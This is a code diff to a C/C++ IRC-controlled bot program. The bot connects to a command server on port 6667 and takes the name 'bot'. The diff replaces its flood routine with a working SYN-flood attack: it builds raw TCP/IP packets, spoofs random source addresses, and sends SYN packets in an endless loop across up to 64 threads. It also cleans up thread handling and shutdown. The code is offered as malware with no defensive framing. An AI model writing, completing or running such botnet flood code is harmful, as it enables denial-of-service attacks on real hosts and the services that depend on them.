@@ -3,12 +3,12 @@
 #include <pthread.h>
 #include <signal.h>
 #include <unistd.h>
+#include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <netdb.h>
 #include <string.h>
-#include <netinet/tcp.h>
 
 #define SERV_ADDR "192.168.47.1"
 #define SERV_PORT 6667
@@ -17,9 +17,175 @@
 #define MAX_WORDS 4
 #define DELAY 1000
 
+static int flooding = 0;
+static int toggle = 0;
+static bool MPTCP_STATUS = 0;
+static int MAX_THREADS = 64;
+static int THREAD_NUM = MAX_THREADS;
+
+struct flood_args{
+    char *addr;
+    int port;
+};
+
+/* Internet Datagram Header */
+#define IPHDR_LEN 20
+struct iphdr {
+	unsigned char ipv:4;     /* Internet Protocol Version */
+	unsigned char ihl:4;     /* Total length (in DWORDs) */
+	unsigned char tos;       /* Type of Service */
+	unsigned short len;      /* Total length */
+	unsigned short id;       /* Identification number */
+	unsigned short frag;     /* Fragment offset and flags */
+	unsigned char ttl;       /* Time to live */
+	unsigned char proto;     /* Protocol type */
+	unsigned short chksum;   /* Checksum */
+	unsigned int src;        /* Source IP Address */
+	unsigned int dst;        /* Destination IP Address */
+};
+
+/* TCP Header */
+#define TCPHDR_LEN 20
+struct tcphdr {
+	unsigned short sport;      /* Source Port */
+	unsigned short dport;      /* Destination Port */
+	unsigned int seq;          /* Sequence number */
+	unsigned int ack;          /* Acknowledgement number */
+	unsigned char reserved:4;
+	unsigned char offset:4;    /* Size of TCP Header in DWORDs */
+	unsigned char flgs;        /* TCP Flags */
+#define TCP_FIN 0x01
+#define TCP_SYN 0x02
+#define TCP_RST 0x04
+#define TCP_PSH 0x08
+#define TCP_ACK 0x10
+#define TCP_URG 0x20
+	unsigned short win;        /* Window. Size of data to accept */
+	unsigned short chksum;     /* Checksum */
+	unsigned short urgp;       /* idk */
+};
+
+/* TCP Psuedo-header */
+#define TCPPH_LEN 12
+struct tcpph {
+	unsigned int src;
+	unsigned int dst;
+	unsigned char zero;
+	unsigned char proto;
+	unsigned short tcp_len;
+};
+
+unsigned short csum(short* data, int len) {
+	int sum = 0;
+	for (; len > 1; len -= 2) sum += *data++;
+	if (len == 1) sum += *(unsigned char*)data;
+	while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
+	return ~sum;
+}
+
+unsigned short rand16() {
+	srandom(time(NULL));
+	srand(random());
+	srandom(rand());
+	return (random() + rand() + time(NULL)) % 65535;
+}
+
+unsigned int rand32() {
+	srandom(time(NULL));
+	srand(random());
+	srandom(rand());
+	return (random() + rand() & time(NULL));
+}
+
+char* randip(char* dst){
+	dst[0] = 0;
+	int i, j, k;
+	srandom(time(0));
+	srand(random());
+	srandom(rand());
+	j = rand() + random();
+	for (i = 0, k = 0; k < 4; i += strlen(dst + i), k++, j += ((rand() + (long)dst) % i) ^ time(0)) {
+		srand((long)dst + i + k);
+		srand(j + dst[i+k] + (long)&i + rand());
+		j = rand() % 255;
+		sprintf(dst + i, "%d.", j);
+	}
+	dst[i-1] = 0;
+	return dst;
+}
+
+void *flood(void *args){
+
+    int sd;
+    char rip[16];
+	char packet[4096];
+	struct iphdr ip;
+	struct tcpph tph;
+	struct tcphdr tcp;
+	struct sockaddr_in sin;
+	const int on = 1;
+
+	memset(&packet, 0, 40);
+	ip.ihl = 5;
+	ip.ipv = 4;
+	ip.tos = 0;
+	ip.len = IPHDR_LEN + TCPHDR_LEN;
+	ip.id = htons(rand16());
+	ip.ttl = 128;
+	ip.proto = IPPROTO_TCP;
+	ip.src = (unsigned int)inet_addr(randip(rip));//
+	ip.dst = (unsigned int)inet_addr(((struct flood_args*)args)->addr);
+	ip.chksum = 0;
+	ip.chksum = csum((short*)&ip, IPHDR_LEN);
+	tcp.sport = htons(6667);//
+	tcp.dport = htons((short)(((struct flood_args*)args)->port));
+	tcp.seq = htonl(rand32());//
+	tcp.offset = sizeof(struct tcphdr) / 4;
+	tcp.flgs = TCP_SYN;
+	tcp.chksum = 0;
+	tph.src = ip.src;
+	tph.dst = ip.dst;
+	tph.zero = 0;
+	tph.proto = IPPROTO_TCP;
+	tph.tcp_len = sizeof(struct tcphdr);
+	memmove(packet, &tph, TCPPH_LEN);
+	memmove(packet + TCPPH_LEN, &tcp, TCPHDR_LEN);
+	tcp.chksum = csum((short*)packet, TCPPH_LEN + TCPHDR_LEN);
+	memmove(packet, &ip, IPHDR_LEN);
+	memmove(packet + IPHDR_LEN, &tcp, TCPHDR_LEN);
+
+	sd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+
+	setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
+	setsockopt(sd, 6, 42, &MPTCP_STATUS, sizeof(MPTCP_STATUS));
+
+	sin.sin_family = AF_INET;
+	sin.sin_port = htons(tcp.dport);
+	memmove(&(sin.sin_addr), &(ip.dst), sizeof(struct in_addr));
+	while (1) {
+        if (sendto(sd, packet, ip.len, 0, (struct sockaddr*)&sin, sizeof(struct sockaddr)) == -1) {
+            printf("Failed to send SYN packet(s). Error code: %d\n", errno);
+			return NULL;
+		}
+        else //printf("Sent SYN packet with spoofed ip: %s\n", rip);
+		ip.id = htons(rand16());
+		ip.src = (unsigned int)inet_addr(randip(rip));
+		ip.chksum = 0;
+		ip.chksum = csum((short*)&ip, IPHDR_LEN);
+		tph.src = ip.src;
+		tcp.seq = htonl(rand32());
+		tcp.chksum = 0;
+		memmove(packet, &tph, TCPPH_LEN);
+		memmove(packet + TCPPH_LEN, &tcp, TCPHDR_LEN);
+		tcp.chksum = csum((short*)packet, TCPPH_LEN + TCPHDR_LEN);
+		memmove(packet, &ip, IPHDR_LEN);
+		memmove(packet + IPHDR_LEN, &tcp, TCPHDR_LEN);
+	}
+
+}
+//---------------------------------------------------------------------------------------------------------------------------------------------------
 class plug {
 public:
-    bool MPTCP_EN;
     int fd;
     int link(const char* host, int port); /* Connect */
     int unlink(); /* Disconnect */
@@ -34,7 +200,6 @@ private:
 
 plug::plug() {
     bi = 0;
-    MPTCP_EN = 0;
 }
 
 int plug::link(const char* host, int port) {
@@ -77,84 +242,16 @@ plug& plug::operator <<(const char* buf) {
     }
     return *this;
 }
-
-static int flooding = 0;
-static int toggle = 0;
-static bool MPTCP_STATUS = 0;
-static int MAX_THREADS = 64;
-static int THREAD_NUM = MAX_THREADS;
+//---------------------------------------------------------------------------------------------------------------------------------------------------------
 
 static plug s;
 
-struct flood_args{
-    char *addr;
-    int port;
-};
-
-//void quit(int sig);
+void quit(int sig) {
+    s.unlink();
+    exit(0);
+}
 
 using namespace std;
-
-void *flood(void *args){
-
-    bool bFlag = 1;
-	char szBuffer[60] = {0};
-	iphdr iphdr;
-	pshdr psdhdr;
-	tcphdr tcphdr;
-
-	struct sockaddr_in si;
-    struct hostent *hostess_twinkies = gethostbyname(*((struct flood_args*)args)->addr);
-
-    setsockopt(sock, SOL_TCP, 42, &MPTCP_STATUS, sizeof(MPTCP_STATUS));
-    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char*)&bFlag, sizeof(bFlag));
-
-    si.sin_family = AF_INET;
-    si.sin_port = htons(*((struct flood_args*)args)->port);
-    si.sin_addr = *((struct in_addr*)hostess_twinkies->h_addr);
-    memset(&(si.sin_zero), 0, 8);
-
-    int sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
-
-	while (1)
-	{
-			iphdr.h_verlen = (4 << 4 | sizeof(iphdr) / sizeof(unsigned long));
-			iphdr.total_len = htons(sizeof(iphdr) + sizeof(tcphdr));
-			iphdr.ident = 1;
-			iphdr.frag_and_flags = 0;
-			iphdr.ttl = 128;
-			iphdr.proto = IPPROTO_TCP;
-			iphdr.checksum = 0;
-			iphdr.sourceIP = inet_addr(ip_getip(sock));//
-			iphdr.destIP = sin.sin_addr;//
-			tcphdr.th_dport = htons(*((struct flood_args*)args)->port);
-			tcphdr.th_sport = htons(rand() % 1025);
-			tcphdr.th_seq = htonl(0x12345678);
-			tcphdr.th_ack = rand() % 3;
-            if (rand() % 2 == 0)tcphdr.th_flags = SYN;
-            else tcphdr.th_flags = ACK;
-			tcphdr.th_lenres = (sizeof(tcphdr) / 4 << 4 | 0);
-			tcphdr.th_win = htons(512);
-			tcphdr.th_urp = 0;
-			tcphdr.th_sum = 0;
-			psdhdr.saddr = iphdr.sourceIP;
-			psdhdr.daddr = iphdr.destIP;
-			psdhdr.mbz = 0;
-			psdhdr.ptcl = IPPROTO_TCP;
-			psdhdr.tcpl = htons(sizeof(tcphdr));
-			memcpy(szBuffer, &psdhdr, sizeof(psdhdr));
-			memcpy(szBuffer + sizeof(psdhdr), &tcphdr, sizeof(tcphdr));
-			tcphdr.th_sum = tcpchecksum((char *)szBuffer, sizeof(psdhdr) + sizeof(tcphdr));
-			memcpy(szBuffer, &iphdr, sizeof(iphdr));
-			memcpy(szBuffer + sizeof(iphdr), &tcphdr, sizeof(tcphdr));
-			memset(szBuffer + sizeof(iphdr) + sizeof(tcphdr), 0, 4);
-			iphdr.checksum = tcpchecksum((char *)szBuffer, sizeof(iphdr) + sizeof(tcphdr));
-			memcpy(szBuffer, &iphdr, sizeof(iphdr));
-			sendto(sock,(char*)&szBuffer, sizeof(szBuffer), 0, (const struct sockaddr*)&sin, sizeof(sin));
-			Sleep(DELAY);
-	}
-    close(sock);
-}
 
 int initThreads(pthread_attr_t *attr){
     if(pthread_attr_init(attr) || pthread_attr_setdetachstate(attr, PTHREAD_CREATE_DETACHED)){
@@ -172,18 +269,17 @@ int attachThreads(pthread_t *threads, pthread_attr_t *attr, flood_args *args, in
             cout << "Could not create threads" << endl;
             return -1;
         }
-        pthread_attr_destroy(attr);
-        return 1;
     }
+    pthread_attr_destroy(attr);
+    return 1;
 }
 int killThreads(pthread_t *threads, pthread_attr_t *attr, int num){
-    pthread_attr_destroy(attr);
     for(int j = 0; j < num; j++){
-        pthread_exit(NULL);
-        pthread_kill(*(threads + j), SIGTERM);
+        pthread_cancel(*(threads + j));
     }
+    return 1;
 }
-
+//------------------------------------------------------------------------------------------------------------------------------
 char* generateNick(){
 	char str[6] = "bot  ";
     char *nick = str;
@@ -284,7 +380,7 @@ int main(){
     struct flood_args args;
 
     struct sigaction sa;
-    //sa.sa_handler = &quit;
+    sa.sa_handler = &quit;
     sa.sa_flags = 0;
     sigemptyset(&sa.sa_mask);
     sigaction(SIGINT,&sa,0);
@@ -323,9 +419,3 @@ int main(){
     s.unlink();
     return 0;
 }
-
-/*void quit(int sig) {
-    s << "CTRL-C pressed. Quit.";
-    s.unlink();
-    exit(0);
-}*/
